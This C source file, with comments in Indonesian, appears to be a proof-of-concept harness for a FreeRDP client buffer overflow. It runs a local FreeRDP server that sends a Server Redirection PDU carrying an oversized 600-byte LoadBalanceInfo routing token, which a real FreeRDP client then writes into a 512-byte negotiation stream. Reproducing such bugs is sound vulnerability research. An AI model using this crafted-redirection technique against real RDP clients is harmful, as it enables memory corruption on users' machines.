/*
 * harness_remote.c — BLOK 5: reachability REMOTE, memakai server & klien FreeRDP yang ASLI.
 *
 * Pelajaran dari percobaan pertama: redirection BUKAN ditangani di jalur nego. Klien menuntut
 * X.224 Connection Confirm di sana (tpdu.c:186). Penerimanya ada di lapisan share-control/RDP:
 *   connection.c:1363 → rdp_recv_out_of_sequence_pdu → case PDU_TYPE_SERVER_REDIRECTION
 *   → rdp_recv_enhanced_security_redirection_packet (redirection.c)
 * Artinya PDU itu datang sebagai ganti/in the middle of PDU aktif — server harus lebih dulu
 * membawa klien melewati X.224 + MCS + keamanan. Karena itu di sini kita memakai API server
 * FreeRDP sendiri (`freerdp_peer`) alih-alih menyusun byte PDU dengan tangan.
 *
 * Alur:
 *   [thread server] socket → freerdp_peer_new → (TLS/RDP) handshake → PostConnect
 *                   → peer->SendServerRedirection(peer, redirection{LoadBalanceInfo=600})
 *   [thread utama ] freerdp_connect ke server itu (klien FreeRDP asli)
 *                   → klien memproses redirection → rdp_client_redirect
 *                   → nego_set_routing_token(600) → menyambung ke target (127.0.0.1)
 *                   → nego_send_negotiation_request MENULIS 600 byte ke stream 512 → OVERFLOW (ASan)
 *
 * Harness ini tidak menyentuh nego_* sama sekali: 600 byte itu datang dari PDU yang dikirim peer.
 */
#include <arpa/inet.h>
#include <netinet/in.h>
#include <pthread.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

#include <freerdp/freerdp.h>
#include <freerdp/peer.h>
#include <freerdp/redirection.h>
#include <freerdp/settings.h>
#include <winpr/wlog.h>

#define TOKEN_LEN 600
#define REDIR_TARGET_PORT 3389

static int g_lfd = -1;
static int g_lfd_target = -1;
static volatile int g_redir_sent = 0;
static volatile int g_redir_rc = -1;
static volatile int g_second_conn = 0;
static const char* g_cert = NULL;
static const char* g_key = NULL;

static unsigned char g_token[TOKEN_LEN];

static void on_alarm(int sig)
{
	(void)sig;
	const char* m = "\n[x] batas waktu 150 s (redirection tak sempat memicu overflow)\n";
	(void)!write(1, m, strlen(m));
	_exit(4);
}

static int listen_on(int port, int* got_port)
{
	const int fd = socket(AF_INET, SOCK_STREAM, 0);
	if (fd < 0)
		return -1;
	{
		int one = 1;
		(void)setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
	}
	struct sockaddr_in sa;
	memset(&sa, 0, sizeof(sa));
	sa.sin_family = AF_INET;
	sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	sa.sin_port = htons((uint16_t)port);
	if (bind(fd, (struct sockaddr*)&sa, sizeof(sa)) < 0 || listen(fd, 4) < 0)
	{
		close(fd);
		return -1;
	}
	{
		socklen_t sl = sizeof(sa);
		if (getsockname(fd, (struct sockaddr*)&sa, &sl) == 0 && got_port)
			*got_port = ntohs(sa.sin_port);
	}
	return fd;
}

/* hook lifecycle peer: hanya mencatat seberapa jauh sekuens koneksi berjalan */
static BOOL on_caps(freerdp_peer* peer)
{
	(void)peer;
	printf("  [server] hook Capabilities dipanggil (klien sudah mengirim kapabilitas)\n");
	fflush(stdout);
	return TRUE;
}

static BOOL on_client_caps(freerdp_peer* peer)
{
	(void)peer;
	printf("  [server] hook ClientCapabilities dipanggil\n");
	fflush(stdout);
	return TRUE;
}

static BOOL on_activate(freerdp_peer* peer)
{
	(void)peer;
	printf("  [server] hook Activate dipanggil (klien aktif)\n");
	fflush(stdout);
	return TRUE;
}

/* kirim redirection sekali (dipakai dari PostConnect maupun dari pemantau connected) */
static BOOL send_redirection(freerdp_peer* peer, const char* why)
{
	if (g_redir_sent)
		return TRUE;
	printf("  [server] mengirim redirection (pemicu: %s)\n", why);
	fflush(stdout);

	rdpRedirection* r = redirection_new();
	if (!r)
		return FALSE;

	BOOL ok = redirection_set_flags(r, LB_TARGET_NET_ADDRESS | LB_LOAD_BALANCE_INFO);
	ok = ok && redirection_set_session_id(r, 0x11223344);
	ok = ok && redirection_set_string_option(r, LB_TARGET_NET_ADDRESS, "127.0.0.1");
	ok = ok && redirection_set_byte_option(r, LB_LOAD_BALANCE_INFO, g_token, sizeof(g_token));
	{
		UINT32 missing = 0;
		const BOOL valid = redirection_settings_are_valid(r, &missing);
		printf("  [server] redirection valid=%s (flag kurang=0x%08x)\n", valid ? "ya" : "TIDAK", missing);
		fflush(stdout);
		ok = ok && valid;
	}
	if (ok && peer->SendServerRedirection)
	{
		ok = peer->SendServerRedirection(peer, r);
		g_redir_rc = ok ? 0 : -2;
		printf("  [server] SendServerRedirection → %s (LoadBalanceInfo=%d byte)\n", ok ? "terkirim" : "GAGAL",
		       TOKEN_LEN);
		g_redir_sent = 1;
	}
	else
	{
		printf("  [server] tak bisa mengirim redirection (ok=%d)\n", (int)ok);
		g_redir_rc = -3;
	}
	fflush(stdout);
	redirection_free(r);
	return g_redir_sent;
}

/* Dipanggil peer saat klien sudah menyelesaikan seluruh sekuens koneksi ke server kita.
 * Di sini kita kirim redirection (data 600 byte) — persis yang dilakukan connection broker. */
static BOOL on_post_connect(freerdp_peer* peer)
{
	printf("  [server] PostConnect: klien selesai handshake — mengirim redirection\n");
	fflush(stdout);
	return send_redirection(peer, "PostConnect");
}

static void* server_thread(void* arg)
{
	(void)arg;
	const struct timespec pause = {0, 5000000L};
	int round = 0;
	for (round = 0; round < 2; round++)
	{
		const int cfd = accept(g_lfd, NULL, NULL);
		if (cfd < 0)
			break;

		if (round == 0)
		{
			printf("  [server] klien tersambung (fd=%d) — memulai peer FreeRDP\n", cfd);
			fflush(stdout);
			freerdp_peer* peer = freerdp_peer_new(cfd);
			if (!peer)
			{
				printf("  [server] freerdp_peer_new gagal\n");
				break;
			}
			peer->ContextSize = sizeof(rdpContext);
			if (!freerdp_peer_context_new(peer))
			{
				printf("  [server] freerdp_peer_context_new gagal\n");
				break;
			}
			rdpSettings* ps = peer->context->settings;
			freerdp_settings_set_bool(ps, FreeRDP_RdpSecurity, TRUE);
			freerdp_settings_set_bool(ps, FreeRDP_TlsSecurity, TRUE);
			freerdp_settings_set_bool(ps, FreeRDP_NlaSecurity, FALSE);
			freerdp_settings_set_bool(ps, FreeRDP_SuppressOutput, TRUE);
			freerdp_settings_set_uint32(ps, FreeRDP_ColorDepth, 32);
			if (g_cert && g_key)
			{
				rdpCertificate* cert = freerdp_certificate_new_from_file(g_cert);
				rdpPrivateKey* key = freerdp_key_new_from_file_enc(g_key, NULL);
				printf("  [server] sertifikat=%s kunci=%s\n", cert ? "ok" : "GAGAL", key ? "ok" : "GAGAL");
				if (cert)
					(void)freerdp_settings_set_pointer_len(ps, FreeRDP_RdpServerCertificate, cert, 1);
				if (key)
					(void)freerdp_settings_set_pointer_len(ps, FreeRDP_RdpServerRsaKey, key, 1);
			}
			peer->Capabilities = on_caps;
			peer->ClientCapabilities = on_client_caps;
			peer->Activate = on_activate;
			peer->PostConnect = on_post_connect;
			if (!peer->Initialize(peer))
			{
				printf("  [server] peer->Initialize gagal\n");
				fflush(stdout);
				break;
			}
			printf("  [server] peer siap — melayani PDUs\n");
			fflush(stdout);
			/* layani sampai redirection terkirim (atau peer putus / batas waktu) */
			int announced = 0;
			for (int i = 0; i < 12000; i++)
			{
				if (!peer->CheckFileDescriptor(peer))
				{
					printf("  [server] peer berhenti setelah %d iterasi (connected=%d)\n", i,
					       (int)peer->connected);
					fflush(stdout);
					break;
				}
				if (!announced && peer->connected)
				{
					printf("  [server] peer melaporkan connected=TRUE pada iterasi %d\n", i);
					fflush(stdout);
					announced = 1;
					/* jalur kedua: kirim begitu koneksi terbentuk (tak menunggu PostConnect) */
					(void)send_redirection(peer, "peer->connected");
				}
				if (g_redir_sent && i > 40)
					break;
				nanosleep(&pause, NULL);
			}
			printf("  [server] redirection terkirim=%d (rc=%d)\n", g_redir_sent, g_redir_rc);
			fflush(stdout);
			freerdp_peer_context_free(peer);
			freerdp_peer_free(peer);
		}
		else
		{
			/* koneksi ke-2 = klien menyambung ke target redirect. Overflow terjadi di sisi klien
			 * saat ia menyusun permintaan (token 600 byte) — server cukup menahan koneksi. */
			printf("  [server] koneksi ke-2 diterima → klien menyusun permintaan dengan token\n");
			fflush(stdout);
			g_second_conn = 1;
			{
				const struct timespec hold = {3, 0};
				nanosleep(&hold, NULL);
			}
			close(cfd);
		}
	}
	return NULL;
}

int main(int argc, char** argv)
{
	WLog_SetLogLevel(WLog_GetRoot(), WLOG_ERROR);
	g_cert = (argc > 1) ? argv[1] : NULL;
	g_key = (argc > 2) ? argv[2] : NULL;
	{
		struct sigaction sa;
		memset(&sa, 0, sizeof(sa));
		sa.sa_handler = on_alarm;
		sigaction(SIGALRM, &sa, NULL);
		alarm(150);
	}

	memset(g_token, 0x41, sizeof(g_token));
	memcpy(g_token, "Cookie: mstshash=poc\r\n", 22);
	memcpy(g_token + 24, "VULNRES-REMOTE-TOKEN", 20);

	printf("harness remote — server FreeRDP asli (peer) x klien FreeRDP asli\n");
	printf("  LoadBalanceInfo (penanda): %.20s (token %d byte, tanpa NUL — dicetak terbatas)\n",
	       (const char*)g_token + 24, TOKEN_LEN);

	int port = 0;
	g_lfd = listen_on(0, &port);
	if (g_lfd < 0)
	{
		printf("  [x] gagal membuka listener utama\n");
		return 3;
	}
	g_lfd_target = listen_on(REDIR_TARGET_PORT, NULL);
	printf("  listener server: 127.0.0.1:%d | target redirect: 127.0.0.1:%d %s\n", port,
	       REDIR_TARGET_PORT, g_lfd_target >= 0 ? "(siap)" : "(tak tersedia)");
	fflush(stdout);

	pthread_t th;
	if (pthread_create(&th, NULL, server_thread, NULL) != 0)
	{
		printf("  [x] gagal membuat thread server\n");
		return 3;
	}

	/* ---- klien FreeRDP asli ---- */
	freerdp* instance = freerdp_new();
	if (!instance)
		return 3;
	instance->ContextSize = sizeof(rdpContext);
	if (!freerdp_context_new(instance))
		return 3;
	rdpSettings* s = instance->context->settings;
	freerdp_settings_set_string(s, FreeRDP_ServerHostname, "127.0.0.1");
	freerdp_settings_set_uint32(s, FreeRDP_ServerPort, (UINT32)port);
	freerdp_settings_set_string(s, FreeRDP_Username, "poc");
	freerdp_settings_set_string(s, FreeRDP_Password, "poc");
	freerdp_settings_set_bool(s, FreeRDP_IgnoreCertificate, TRUE);
	freerdp_settings_set_uint32(s, FreeRDP_TcpConnectTimeout, 10000);

	printf("  [klien] freerdp_connect → 127.0.0.1:%d\n", port);
	fflush(stdout);
	const BOOL ok = freerdp_connect(instance);
	printf("  [klien] freerdp_connect kembali: %s (redirection terkirim=%d, koneksi ke-2=%d)\n",
	       ok ? "TRUE" : "FALSE", g_redir_sent, g_second_conn);
	fflush(stdout);

	/* Klien nyata memproses PDU masuk di loop ini — di sinilah redirection diterapkan. */
	if (ok)
	{
		const struct timespec p = {0, 5000000L};
		printf("  [klien] masuk loop penerimaan (freerdp_check_fds)\n");
		fflush(stdout);
		for (int i = 0; i < 400; i++)
		{
			if (!freerdp_check_fds(instance))
			{
				printf("  [klien] check_fds FALSE pada iterasi %d\n", i);
				fflush(stdout);
				break;
			}
			if (g_redir_sent)
				break;
			nanosleep(&p, NULL);
		}
		printf("  [klien] setelah loop: redirection terkirim=%d, koneksi ke-2=%d\n", g_redir_sent,
		       g_second_conn);
		fflush(stdout);
		if (g_redir_sent && !g_second_conn)
		{
			/* Redirection sudah diterapkan ke settings; menyambung ke target adalah tugas
			 * aplikasi klien (API resmi: freerdp_reconnect). Di sinilah permintaan negosiasi
			 * baru dibangun — dengan routing token 600 byte dari PDU tadi. */
			printf("  [klien] memanggil freerdp_reconnect → menyambung ke target redirect\n");
			fflush(stdout);
			const BOOL rc = freerdp_reconnect(instance);
			printf("  [klien] freerdp_reconnect kembali: %s\n", rc ? "TRUE" : "FALSE");
			fflush(stdout);
		}
	}

	(void)freerdp_disconnect(instance);
	freerdp_context_free(instance);
	freerdp_free(instance);
	pthread_join(th, NULL);

	if (!g_redir_sent)
	{
		printf("  [x] redirection tak pernah terkirim — tak mengklaim apa pun\n");
		return 1;
	}
	printf("  [i] tak ada laporan ASan — overflow tidak terpicu pada jalur ini\n");
	return 1;
}
